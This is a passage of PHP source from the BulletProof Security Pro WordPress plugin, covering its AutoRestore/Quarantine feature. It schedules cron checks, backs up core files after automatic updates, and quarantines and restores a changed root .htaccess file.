	if ( $bpsCronCheck == 'minutes_1' || $bpsCronCheck == 'minutes_2' || $bpsCronCheck == 'minutes_3' || $bpsCronCheck == 'minutes_4' || $bpsCronCheck == 'minutes_10' || $bpsCronCheck == 'minutes_15' || $bpsCronCheck == 'minutes_30' || $bpsCronCheck == 'minutes_60' ) {
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
	
	if ( !wp_next_scheduled('bpsPro_AutoRestore_check') ) {
		wp_schedule_event( time(), 'minutes_5', 'bpsPro_AutoRestore_check' );
	}
	}
	
	if ( $options['bps_autorestore_cron_frequency'] == '10' ) {
	if ( $bpsCronCheck == 'minutes_1' || $bpsCronCheck == 'minutes_2' || $bpsCronCheck == 'minutes_3' || $bpsCronCheck == 'minutes_4' || $bpsCronCheck == 'minutes_5' || $bpsCronCheck == 'minutes_15' || $bpsCronCheck == 'minutes_30' || $bpsCronCheck == 'minutes_60' ) {
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
	
	if ( !wp_next_scheduled('bpsPro_AutoRestore_check') ) {
		wp_schedule_event( time(), 'minutes_10', 'bpsPro_AutoRestore_check' );
	}
	}
	
	if ( $options['bps_autorestore_cron_frequency'] == '15' ) {
	if ( $bpsCronCheck == 'minutes_1' || $bpsCronCheck == 'minutes_2' || $bpsCronCheck == 'minutes_3' || $bpsCronCheck == 'minutes_4' || $bpsCronCheck == 'minutes_5' || $bpsCronCheck == 'minutes_10' || $bpsCronCheck == 'minutes_30' || $bpsCronCheck == 'minutes_60' ) {
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
	
	if ( !wp_next_scheduled('bpsPro_AutoRestore_check') ) {
		wp_schedule_event( time(), 'minutes_15', 'bpsPro_AutoRestore_check' );
	}
	}
	
	if ( $options['bps_autorestore_cron_frequency'] == '30' ) {
	if ( $bpsCronCheck == 'minutes_1' || $bpsCronCheck == 'minutes_2' || $bpsCronCheck == 'minutes_3' || $bpsCronCheck == 'minutes_4' || $bpsCronCheck == 'minutes_5' || $bpsCronCheck == 'minutes_10' || $bpsCronCheck == 'minutes_15' || $bpsCronCheck == 'minutes_60' ) {
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
	
	if ( !wp_next_scheduled('bpsPro_AutoRestore_check') ) {
		wp_schedule_event( time(), 'minutes_30', 'bpsPro_AutoRestore_check' );
	}
	}

	if ( $options['bps_autorestore_cron_frequency'] == '60' ) {
	if ( $bpsCronCheck == 'minutes_1' || $bpsCronCheck == 'minutes_2' || $bpsCronCheck == 'minutes_3' || $bpsCronCheck == 'minutes_4' || $bpsCronCheck == 'minutes_5' || $bpsCronCheck == 'minutes_10' || $bpsCronCheck == 'minutes_15' || $bpsCronCheck == 'minutes_30' ) {
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
	
	if ( !wp_next_scheduled('bpsPro_AutoRestore_check') ) {
		wp_schedule_event( time(), 'minutes_60', 'bpsPro_AutoRestore_check' );
	}
	}

	} // end if bps_autorestore_cron On
	elseif ( $options['bps_autorestore_cron'] == 'Off' ) { 
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
}

add_action('init', 'bpsPro_schedule_AutoRestore_checks');

// ARQ Cron FailSafe Shutdown - WP Dashboard Notice
// The ARQ cron functions will each exit their scripts if the directories or files do not exist - this is a notice function
function bps_ARQFailSafeShutdown_wp() {

	if ( current_user_can('manage_options') ) {

	$options = get_option('bulletproof_security_options_ARCM');
	//$ARQRoot1 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/auto_.htaccess';
	//$ARQRoot2 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/wp-config.php';
	$ARQRoot3 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/index.php';
	$ARQDirWPadmin =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/';
	$ARQDirWPincludes =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-includes/';
	$ARQDirWPcontent =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-content/';
	$ARQFSWPadmin =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/admin.php';
	$ARQFSWPincludes =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-includes/functions.php';
	$ARQFSWPcontent =  WP_CONTENT_DIR . '/bps-backup/autorestore/wp-content/index.php';
	$bpsClassFile = WP_PLUGIN_DIR . '/bulletproof-security/includes/class.php';
	$bpsClassFileARQMB = WP_CONTENT_DIR . '/bps-backup/master-backups/class.php';	

	if ( $options['bps_autorestore_cron'] == 'On' ) {
	
	if ( file_exists($bpsClassFileARQMB) && filemtime($bpsClassFileARQMB) != filemtime($bpsClassFile) ) {
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="blue">'.__('ARQ Cron FailSafe Shutdown Notice', 'bulletproof-security').'</font><br>'.__('This FailSafe notice should go away automatically by clicking anywhere in your WordPress Dashboard.', 'bulletproof-security').'<br>'.__('If this FailSafe notice does not go away automatically then go to the BPS Pro Setup Menu and run the Pre-Installation Wizard and the Setup Wizard again.', 'bulletproof-security').'</div>';
		echo $text;
	}

	if ( ! file_exists($ARQRoot3) ) {
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">'.__('ARQ Cron FailSafe Shutdown: File Backup is Required before the ARQ Infinity Cron will run.', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to AutoRestore to Backup your Root Files.', 'bulletproof-security').'</div>';
		echo $text;	
	}
	
	if ( ! is_dir($ARQDirWPadmin) || ! file_exists($ARQFSWPadmin) ) {	
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">'.__('ARQ Cron FailSafe Shutdown: File Backup is Required before the ARQ Infinity Cron will run.', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to AutoRestore to Backup your wp-admin Files.', 'bulletproof-security').'</div>';
		echo $text;
	}
	
	if ( ! is_dir($ARQDirWPincludes) || ! file_exists($ARQFSWPincludes) ) {	
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">'.__('ARQ Cron FailSafe Shutdown: File Backup is Required before the ARQ Infinity Cron will run.', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to AutoRestore to Backup your wp-includes Files.', 'bulletproof-security').'</div>';
		echo $text;
	}

	if ( ! is_dir($ARQDirWPcontent) || ! file_exists($ARQFSWPcontent) ) {	
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">'.__('ARQ Cron FailSafe Shutdown: File Backup is Required before the ARQ Infinity Cron will run.', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to AutoRestore to Backup your wp-content Files.', 'bulletproof-security').'<br>'.__('Check that the /wp-content/index.php file exists. If it does not exist then upload a new WP index.php file to your wp-content folder.', 'bulletproof-security').'</div>';
		echo $text;
	}	
	}
	}
}
add_action('admin_notices', 'bps_ARQFailSafeShutdown_wp');

// AutoRestore - Turn Off ARQ, Backup Files, Turn ARQ back On, lock index.php & wp-blog-header.php, clear php error log alert 
// FailSafe: Each ARQ Cron function will not run if BPS DB time stamp is less than the actual file time stamp. The reason for
// that is WP files would be quarantined right after the automatic update occurs.
// Updates the BPS DB timestamp & wp version after it has been run once so that the BPS DB timestamp is greater than the file timestamp by 15 minutes.
// The actual last modified time of the version.php file is not important from a now vs a past point of view.
// Testing: Must wait 15 minutes inbetween tests in order to test accurately (old info?)
function bpsPro_ARQ_wp_autoupdate() {
global $wp_version;
	
	$Autoupdateoptions = get_option('bulletproof_security_options_wp_version');
	$versionphp = ABSPATH . 'wp-includes/version.php';
	$gmt_offset = get_option( 'gmt_offset' ) * 3600;
	$last_modified_time_versionphp = date("F d Y H:i", filemtime($versionphp) + $gmt_offset);
	
	// The BPS DB time stamp is always going to be 15 minutes greater than the actual file time stamp after this function
	// has been processed once. This function will return here if the function has already been processed once.
	if ( strtotime($Autoupdateoptions['bps_wp_version_last_modified_time']) > strtotime($last_modified_time_versionphp) ) {
		return;		
	}	

	$FlockOptions = get_option('bulletproof_security_options_flock');
	$ARQoptions = get_option('bulletproof_security_options_ARCM');
	$bpsProLog = WP_CONTENT_DIR . '/bps-backup/logs/http_error_log.txt';
	$timeNow = time();
	$timestamp = date_i18n(get_option('date_format'), strtotime("11/15-1976")) . ' - ' . date_i18n(get_option('time_format'), $timeNow + $gmt_offset);
	$index = ABSPATH . 'index.php';
	$wpblogheader = ABSPATH . 'wp-blog-header.php';
	$last_modified_time_versionphpPlus5 = date("F d Y H:i", filemtime($versionphp) + $gmt_offset + 300);

	// The BPS DB time stamp will be less than the actual file time stamp when a new WP Automatic update occurs.
	if ( strtotime($Autoupdateoptions['bps_wp_version_last_modified_time']) < strtotime($last_modified_time_versionphp) ) {
		set_time_limit(300);
		
		// Turn Off the AutoRestore Cron
		$bps_option_name11 = 'bulletproof_security_options_ARCM';
		
		if ( ! $ARQoptions['bps_autorestore_cron_frequency'] ) {
			$bps_new_value11_1 = '2';	
		} else {
			$bps_new_value11_1 = $ARQoptions['bps_autorestore_cron_frequency'];
		}	
	
		$bps_new_value11_2 = 'Off';
		
		if ( ! $ARQoptions['bps_autorestore_cron_override'] ) {
			$bps_new_value11_3 = 'Off';
		} else {
			$bps_new_value11_3 = $ARQoptions['bps_autorestore_cron_override'];
		}
		
		if ( ! $ARQoptions['bps_autorestore_cron_filecheck'] ) {
			$bps_new_value11_3a = 'On';	
		} else {
			$bps_new_value11_3a = $ARQoptions['bps_autorestore_cron_filecheck'];
		}

		if ( ! $ARQoptions['bps_autorestore_cron_forced'] ) {
			$bps_new_value11_4 = '1';	
		} else {
			$bps_new_value11_4 = $ARQoptions['bps_autorestore_cron_forced'];
		}	
	
		if ( ! $ARQoptions['bps_autorestore_cron_end'] ) {
			$bps_new_value11_5 = '';	
		} else {
			$bps_new_value11_5 = $ARQoptions['bps_autorestore_cron_end'];
		}	

		$BPS_Options11 = array(
		'bps_autorestore_cron_frequency' 	=> $bps_new_value11_1, 
		'bps_autorestore_cron' 				=> $bps_new_value11_2, 
		'bps_autorestore_cron_override' 	=> $bps_new_value11_3, 
		'bps_autorestore_cron_filecheck' 	=> $bps_new_value11_3a, 
		'bps_autorestore_cron_forced' 		=> $bps_new_value11_4, 
		'bps_autorestore_cron_end' 			=> $bps_new_value11_5
		);

		if ( ! get_option( $bps_option_name11 ) ) {	
		
			foreach( $BPS_Options11 as $key => $value ) {
				update_option('bulletproof_security_options_ARCM', $BPS_Options11);
			}
				$fh = @fopen($bpsProLog, 'a');
 				@fwrite($fh, "\r\n[WP Automatic Update - ARQ was turned Off - $timestamp]\r\n");
 				@fclose($fh);	
		
		} else {

			foreach( $BPS_Options11 as $key => $value ) {
				update_option('bulletproof_security_options_ARCM', $BPS_Options11);
			}	
				$fh = @fopen($bpsProLog, 'a');
 				@fwrite($fh, "\r\n[WP Automatic Update - ARQ was turned Off - $timestamp]\r\n");
 				@fclose($fh);		
		}
			
		// Only back up files that have been modified in a 5 minute window of time
		// Root Files Backup
		$Rootsource = rtrim(ABSPATH, "/");
		$Rootdest = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files';
						
		if ( is_dir($Rootsource) ) {
			$Rootiterator = new DirectoryIterator($Rootsource);

			foreach ( $Rootiterator as $Rootfile ) {
				try {
    				if ($Rootfile->isFile()) {
						$RootFilemtime = date("F d Y H:i", $Rootfile->getMTime() + $gmt_offset);	
						
						if ( strtotime($RootFilemtime) >= strtotime($last_modified_time_versionphp) && strtotime($RootFilemtime) < strtotime($last_modified_time_versionphpPlus5) ) {						
							copy($Rootfile->getPathname(), $Rootdest.DIRECTORY_SEPARATOR.$Rootfile->getFilename());
								
							$fh = @fopen($bpsProLog, 'a');
 							@fwrite($fh, "\r\n[WP Automatic Update - ARQ Root File Backup - $timestamp]\r\n");
							@fwrite($fh, 'File: '.$Rootfile->getPathname()."\r\n");
							@fclose($fh);
						}
					}
				} catch (RuntimeException $e) {}	
			}
		}
						
		// wp-admin Files Backup
		$wpadmin_source = ABSPATH.'wp-admin';
		$wpadmin_dest = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/';				

		if ( is_dir($wpadmin_source) ) {
			$wpadmin_iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($wpadmin_source), RecursiveIteratorIterator::SELF_FIRST);						
					
			foreach ( $wpadmin_iterator as $wpadmin_file ) {
				if ( $wpadmin_file->isFile() ) {
					$wpadmin_Filemtime = date("F d Y H:i", $wpadmin_file->getMTime() + $gmt_offset);
					
					if ( strtotime($wpadmin_Filemtime) >= strtotime($last_modified_time_versionphp) && strtotime($wpadmin_Filemtime) < strtotime($last_modified_time_versionphpPlus5) ) {						
						
						copy($wpadmin_file, $wpadmin_dest.DIRECTORY_SEPARATOR.$wpadmin_iterator->getSubPathName());
						
						$fh = @fopen($bpsProLog, 'a');
 						@fwrite($fh, "\r\n[WP Automatic Update - ARQ wp-admin File Backup - $timestamp]\r\n");
						@fwrite($fh, 'File: '.$wpadmin_file."\r\n");
						@fclose($fh);					
					}
				}
			}
		}
					
		// wp-includes Files Backup					
		$wpincludes_source = ABSPATH.'wp-includes';
		$wpincludes_dest = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-includes/';					
					
		if ( is_dir($wpincludes_source) ) {
			$wpincludes_iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($wpincludes_source), RecursiveIteratorIterator::SELF_FIRST);						
					
			foreach ( $wpincludes_iterator as $wpincludes_file ) {
				if ( $wpincludes_file->isFile() ) {
					$wpincludes_Filemtime = date("F d Y H:i", $wpincludes_file->getMTime() + $gmt_offset);
					
					if ( strtotime($wpincludes_Filemtime) >= strtotime($last_modified_time_versionphp) && strtotime($wpincludes_Filemtime) < strtotime($last_modified_time_versionphpPlus5) ) {					
						
						copy($wpincludes_file, $wpincludes_dest.DIRECTORY_SEPARATOR.$wpincludes_iterator->getSubPathName());
						
						$fh = @fopen($bpsProLog, 'a');
 						@fwrite($fh, "\r\n[WP Automatic Update - ARQ wp-includes File Backup - $timestamp]\r\n");
						@fwrite($fh, 'File: '.$wpincludes_file."\r\n");
						@fclose($fh);		
					}
				}
			}
		}				
					
		// wp-content Files Backup - this will backup updated Theme & Plugin files too if they are not excluded					
		$wpcontent_source = WP_CONTENT_DIR;
		$wpcontent_dest = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-content/';					
					
		if ( is_dir($wpcontent_source) ) {
			$wpcontent_dirItr    = new RecursiveDirectoryIterator($wpcontent_source);		
			$wpcontent_filterItr = new BPSCopyWPCRecursiveFilterIterator($wpcontent_dirItr);
			$wpcontent_iterator  = new RecursiveIteratorIterator($wpcontent_filterItr, RecursiveIteratorIterator::SELF_FIRST); 
					
			foreach ( $wpcontent_iterator as $wpcontent_file ) {
				if ( $wpcontent_file->isFile() ) {
					$wpcontent_Filemtime = date("F d Y H:i", $wpcontent_file->getMTime() + $gmt_offset);
					
					if ( strtotime($wpcontent_Filemtime) >= strtotime($last_modified_time_versionphp) && strtotime($wpcontent_Filemtime) < strtotime($last_modified_time_versionphpPlus5) ) {		
						
						copy($wpcontent_file, $wpcontent_dest.DIRECTORY_SEPARATOR.$wpcontent_iterator->getSubPathName());
						
						$fh = @fopen($bpsProLog, 'a');
 						@fwrite($fh, "\r\n[WP Automatic Update - ARQ wp-content File Backup - $timestamp]\r\n");
						@fwrite($fh, 'File: '.$wpcontent_file."\r\n");
						@fclose($fh);					
					}
				}
			}
		}						
		
		// Lock the index.php and wp-blog-header.php files if they were previously locked		
		if ( $FlockOptions['bps_lock_index_php'] == 'yes' ) {
			@chmod($index, 0400);
				$fh = @fopen($bpsProLog, 'a');
 				@fwrite($fh, "\r\n[WP Automatic Update - index.php file locked - $timestamp]\r\n");
				@fclose($fh);				
		}
		if ( $FlockOptions['bps_lock_wpblog_header'] == 'yes' ) {
			@chmod($wpblogheader, 0400);
				$fh = @fopen($bpsProLog, 'a');
 				@fwrite($fh, "\r\n[WP Automatic Update - wp-blog-header.php file locked - $timestamp]\r\n");
				@fclose($fh);			
		}		

/*	remove this old code after testing is completed			
		// Clear the php error log alert - Touch the php error log file so that the DB timestamp and file timestamp match
		$optionsElogLocation = get_option('bulletproof_security_options2');
		$optionsElogTime = get_option('bulletproof_security_options_elog');
		$Elogfile = $optionsElogLocation['bps_error_log_location'];
		$last_modified_time_db = $optionsElogTime['bps_error_log_date_mod'];
		$Elogtime = strtotime($last_modified_time_db);
		
		touch($Elogfile, $Elogtime);
			$fh = @fopen($bpsProLog, 'a');
 			@fwrite($fh, "\r\n[WP Automatic Update - PHP Error Log timestamp synchronized - $timestamp]\r\n");
			@fclose($fh);			
*/
		// Sync php error log alert time
		$optionsElogLocation = get_option('bulletproof_security_options2');
		$Elogfile = $optionsElogLocation['bps_error_log_location'];
		$last_modified_time_file = date("F d Y H:i:s", filemtime($Elogfile) + $gmt_offset);
		$Elog_time_db = 'bulletproof_security_options_elog';
				
		$BPS_db_Elog = array( 'bps_error_log_date_mod' => $last_modified_time_file );	
				
		foreach( $BPS_db_Elog as $key => $value ) {
			update_option('bulletproof_security_options_elog', $BPS_db_Elog);
		}
		
		$fh = @fopen($bpsProLog, 'a');
 		@fwrite($fh, "\r\n[WP Automatic Update - PHP Error Log timestamp synchronized - $timestamp]\r\n");
		@fclose($fh);

		// Sync the wp version & set/save the last modified file time of version.php file + 15 minutes to DB
		$bps_option_name12 = 'bulletproof_security_options_wp_version';
		$bps_new_value12 = $wp_version;	
		$bps_new_value12_1 = date("F d Y H:i", filemtime($versionphp) + $gmt_offset + 900);	
			
		$BPS_Options12 = array( 'bps_wp_version' => $bps_new_value12, 'bps_wp_version_last_modified_time' => $bps_new_value12_1 );	
	
		if ( ! get_option( $bps_option_name12 ) ) {	
		
			foreach( $BPS_Options12 as $key => $value ) {
				update_option('bulletproof_security_options_wp_version', $BPS_Options12);
			}
				$fh = @fopen($bpsProLog, 'a');
				@fwrite($fh, "\r\n[WP Automatic Update - WP Update Time - $timestamp]\r\n");
				@fwrite($fh, 'Internal Usage: WP Version Synchronized' . "\r\n");
				@fwrite($fh, 'Internal Usage: Last Modified Time: ' . $last_modified_time_versionphp . "\r\n");
				@fwrite($fh, 'Internal Usage: BPS DB Value filemtime +15: ' . $bps_new_value12_1 . "\r\n");
				@fclose($fh);	
			
		} else {

			foreach( $BPS_Options12 as $key => $value ) {
				update_option('bulletproof_security_options_wp_version', $BPS_Options12);
			}	
				$fh = @fopen($bpsProLog, 'a');
 				@fwrite($fh, "\r\n[WP Automatic Update - WP Update Time - $timestamp]\r\n");
				@fwrite($fh, 'Internal Usage: WP Version Synchronized' . "\r\n");
				@fwrite($fh, 'Internal Usage: Last Modified Time: ' . $last_modified_time_versionphp . "\r\n");
				@fwrite($fh, 'Internal Usage: BPS DB Value filemtime +15: ' . $bps_new_value12_1 . "\r\n");
				@fclose($fh);			
		}

		// Turn AutoRestore back On if ARQ Cron Override is not set to On 
		if ( $ARQoptions['bps_autorestore_cron_override'] != 'On' ) {		
		
		$BPS_Options13 = array(
		'bps_autorestore_cron_frequency' 	=> $ARQoptions['bps_autorestore_cron_frequency'], 
		'bps_autorestore_cron' 				=> 'On', 
		'bps_autorestore_cron_override' 	=> 'Off', 
		'bps_autorestore_cron_forced' 		=> $ARQoptions['bps_autorestore_cron_forced'], 
		'bps_autorestore_cron_filecheck' 	=> $ARQoptions['bps_autorestore_cron_filecheck'], 
		'bps_autorestore_cron_end' 			=> $ARQoptions['bps_autorestore_cron_end']
		);	
						
		foreach( $BPS_Options13 as $key => $value ) {
			update_option('bulletproof_security_options_ARCM', $BPS_Options13);
		}					
			$fh = @fopen($bpsProLog, 'a');
 			@fwrite($fh, "\r\n[WP Automatic Update - ARQ was turned back On - $timestamp]\r\n");
			@fclose($fh);
		}
	}
}

// AutoRestore / Quarantine Master ARQ Fire loads each folder Cron & saves a new timestamp if forced == 2
// ARQ Infinity - Copyright (C) 2011-2015 Edward Alexander, AIT-pro.com, edward@ait-pro.com. All rights reserved.
function bps_Master_ARQ_Fire() {
$options = get_option('bulletproof_security_options_ARCM');	

	if ( $options['bps_autorestore_cron_forced'] == '1' ) {
		bps_ARQ_Root();
		bps_ARQ_wpadmin();
		bps_ARQ_wpincludes();
		bps_ARQ_wpcontent();
		bps_ARQ_addedFiles();
	}
	
	if ( $options['bps_autorestore_cron_forced'] == '2' && time() < $options['bps_autorestore_cron_end'] ) {
		exit();
	
	} else {
	
		bps_ARQ_Root();
		bps_ARQ_wpadmin();
		bps_ARQ_wpincludes();
		bps_ARQ_wpcontent();
		bps_ARQ_addedFiles();
	
	if ( $options['bps_autorestore_cron_frequency'] == '1' ) {
		$arq_cron_end = time() + 60;	
	}
	if ( $options['bps_autorestore_cron_frequency'] == '2' ) {
		$arq_cron_end = time() + 120;	
	}
	if ( $options['bps_autorestore_cron_frequency'] == '3' ) {
		$arq_cron_end = time() + 180;	
	}	
	if ( $options['bps_autorestore_cron_frequency'] == '4' ) {
		$arq_cron_end = time() + 240;	
	}
	if ( $options['bps_autorestore_cron_frequency'] == '5' ) {
		$arq_cron_end = time() + 300;	
	}	
	if ( $options['bps_autorestore_cron_frequency'] == '10' ) {
		$arq_cron_end = time() + 600;	
	}
	if ( $options['bps_autorestore_cron_frequency'] == '15' ) {
		$arq_cron_end = time() + 900;	
	}	
	if ( $options['bps_autorestore_cron_frequency'] == '30' ) {
		$arq_cron_end = time() + 1800;	
	}	
	if ( $options['bps_autorestore_cron_frequency'] == '60' ) {
		$arq_cron_end = time() + 3600;	
	}

	$BPS_Options = array(
	'bps_autorestore_cron' 				=> $options['bps_autorestore_cron'], 
	'bps_autorestore_cron_frequency' 	=> $options['bps_autorestore_cron_frequency'], 
	'bps_autorestore_cron_override' 	=> $options['bps_autorestore_cron_override'], 
	'bps_autorestore_cron_filecheck' 	=> $options['bps_autorestore_cron_filecheck'], 
	'bps_autorestore_cron_forced' 		=> $options['bps_autorestore_cron_forced'], 
	'bps_autorestore_cron_end' 			=> $arq_cron_end
	);	
	
		foreach( $BPS_Options as $key => $value ) {
			update_option('bulletproof_security_options_ARCM', $BPS_Options);
		}
	}
}

// AutoRestore / Quarantine Root Files
// ARQ Infinity - Copyright (C) 2011-2015 Edward Alexander, AIT-pro.com, edward@ait-pro.com. All rights reserved.
function bps_ARQ_Root() {
global $wpdb, $wp_version;

	if ( !get_option('bulletproof_security_options_ARCM' ) ) {
		exit();
	}

	$indexARQ = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/index.php';
	
	// ARQ Cron FailSafe Shutdown
	if ( !file_exists($indexARQ) ) {
		exit();	
	}

	$bpsClassFile = WP_PLUGIN_DIR . '/bulletproof-security/includes/class.php';
	$bpsClassFileARQMB = WP_CONTENT_DIR . '/bps-backup/master-backups/class.php';
	
	// Failsafe for class.php ARQ Exclude rules
	if ( file_exists($bpsClassFileARQMB) && filemtime($bpsClassFileARQMB) != filemtime($bpsClassFile) ) {
		exit();
	}

	$options = get_option('bulletproof_security_options_ARCM');
	
	if ( $options['bps_autorestore_cron'] == 'On' ) {

	// WordPress Automatic Updates
	bpsPro_ARQ_wp_autoupdate();
	
	$Autoupdateoptions = get_option('bulletproof_security_options_wp_version'); 	
	$versionphp = ABSPATH . 'wp-includes/version.php';
	$gmt_offset = get_option( 'gmt_offset' ) * 3600;
	$last_modified_time_versionphp = date("F d Y H:i", filemtime($versionphp) + $gmt_offset);

	// WordPress Automatic Update FailSafe
	// If a WP automatic update has occurred the bps db time stamp will be less than the file time stamp
	if ( strtotime($Autoupdateoptions['bps_wp_version_last_modified_time']) < strtotime($last_modified_time_versionphp) ) {		
		exit();	
	}

	// ARQ Cron Override is On - do not check/monitor files
	if ( $options['bps_autorestore_cron_override'] == 'On' ) {
		exit();	
	}

	$options2 = get_option('bulletproof_security_options_autolock');
	$Flockoptions = get_option('bulletproof_security_options_flock'); 
	$table_name = $wpdb->prefix . "bpspro_arq_quarantine";
	$bpspro_arq_exclude_table = $wpdb->prefix . "bpspro_arq_exclude";
	$bpsProLog = WP_CONTENT_DIR . '/bps-backup/logs/autorestore_log.txt';
	$timeNow = time();
	$gmt_offset = get_option( 'gmt_offset' ) * 3600;
	$timestamp = date_i18n(get_option('date_format'), strtotime("11/15-1976")) . ' ' . date_i18n(get_option('time_format'), $timeNow + $gmt_offset);
	$sapi_type = php_sapi_name();
	bpsPro_Core_Files_Check();
	$htaccessARQ = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/auto_.htaccess';
	$htaccess = ABSPATH.'.htaccess';
	$index = ABSPATH.'index.php';
	$wpconfig = ABSPATH.'wp-config.php';
	$wpconfigARQ = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/wp-config.php';
	$wpblogheader = ABSPATH.'wp-blog-header.php';
	$wpblogheaderARQ = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/wp-blog-header.php';
	$Qpath = WP_CONTENT_DIR . '/bps-backup/quarantine/';

	// Array for XAMPP and possible future Windows IIS issues - this array has multiple purposes
	// includes all source and backup path possibilities
	// used to exclude this file from being checked later in the array slice or for DB Exlude
	$XARQPath1 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/auto_.htaccess';
	$XARQPath2 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files\auto_.htaccess';
	$XARQPath3 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/.htaccess';
	$XARQPath4 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files\.htaccess';	
	$XARQPath5 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/index.php';
	$XARQPath6 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files\index.php';
	$XARQPath7 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/wp-config.php';
	$XARQPath8 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files\wp-config.php';	
	$XARQPath9 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/wp-blog-header.php';
	$XARQPath10 = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files\wp-blog-header.php';	
	$xamppPath1 = $_SERVER['DOCUMENT_ROOT'].'\.htaccess';
	$xamppPath1b = $_SERVER['DOCUMENT_ROOT'].'/.htaccess';
	$xamppPath2 = $_SERVER['DOCUMENT_ROOT'].'\index.php';
	$xamppPath2b = $_SERVER['DOCUMENT_ROOT'].'/index.php';
	$xamppPath3 = $_SERVER['DOCUMENT_ROOT'].'\wp-config.php';
	$xamppPath3b = $_SERVER['DOCUMENT_ROOT'].'/wp-config.php';
	$xamppPath4 = $_SERVER['DOCUMENT_ROOT'].'\wp-blog-header.php';
	$xamppPath4b = $_SERVER['DOCUMENT_ROOT'].'/wp-blog-header.php';
	$normalPath1 = ABSPATH.'.htaccess';
	$normalPath2 = ABSPATH.'index.php';
	$normalPath3 = ABSPATH.'wp-config.php';
	$normalPath4 = ABSPATH.'wp-blog-header.php';
	$pathArray = array($xamppPath1, $xamppPath1b, $normalPath1, $xamppPath2, $xamppPath2b, $normalPath2, $xamppPath3, $xamppPath3b, $normalPath3, $xamppPath4, $xamppPath4b, $normalPath4, $XARQPath1, $XARQPath2, $XARQPath3, $XARQPath4, $XARQPath5, $XARQPath6, $XARQPath7, $XARQPath8, $XARQPath9, $XARQPath10);	
	
	$forward_slash = '/'; // return all rows with a forward slash in them or in other words all rows	
	$getARQExcludeRows = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $bpspro_arq_exclude_table WHERE arq_exclude_source LIKE %s", "%$forward_slash%") );		
	$ExludedPaths = array();
				
	foreach ( $getARQExcludeRows as $row ) {
		$ExludedPaths[] = $row->arq_exclude_source;
	}
	
	// Special handling of 4 Root files - .htaccess, index.php, wp-config.php & wp-blog-header.php - Excluded from the ARQ foreach statement
	// Root .htaccess file will be renamed to /bps-backup/autorestore/auto_.htaccess & also in Quarantine folder
	if ( file_exists($htaccessARQ) && @filesize($htaccess) != @filesize($htaccessARQ) && ! in_array($pathArray, $ExludedPaths) ) {
		$permsHtaccess = @substr(sprintf('%o', fileperms($htaccess)), -4);
	if ( ! file_exists($Qpath.'auto_.htaccess') ) {	
		
		$log_contents = "\r\n" . '[Root File AutoRestore Logged: ' . $timestamp . ']' . "\r\n" . 'Quarantined File: Root .htaccess file renamed to auto_.htaccess' .  "\r\n" . 'Quarantine Folder: '.$Qpath."\r\n" . 'AutoRestored File: '.$htaccess."\r\n" . 'Quarantined From/Restore Path: '.$htaccess."\r\n";

		$handle = @fopen( $bpsProLog, 'a' );
		@fwrite($handle, $log_contents);
		fclose($handle);		
		
			@copy($htaccess, $Qpath.'auto_.htaccess');
			$rows_affected = $wpdb->insert( $table_name, array( 'time' => current_time('mysql'), 'arq_quarantine_source' => $htaccess, 'arq_quarantine_backup' => $htaccessARQ, 'arq_quarantine_qpath' => $Qpath.'auto_.htaccess') );
			@copy($htaccessARQ, $htaccess);	

			if ( substr($sapi_type, 0, 6) != 'apache' || @$permsHtaccess != '0666' || @$permsHtaccess != '0777') { // Windows IIS, XAMPP, etc
				@chmod($htaccess, 0644);
			}
			
			bps_smonitor_autorestore_email();
	
	} else {
		
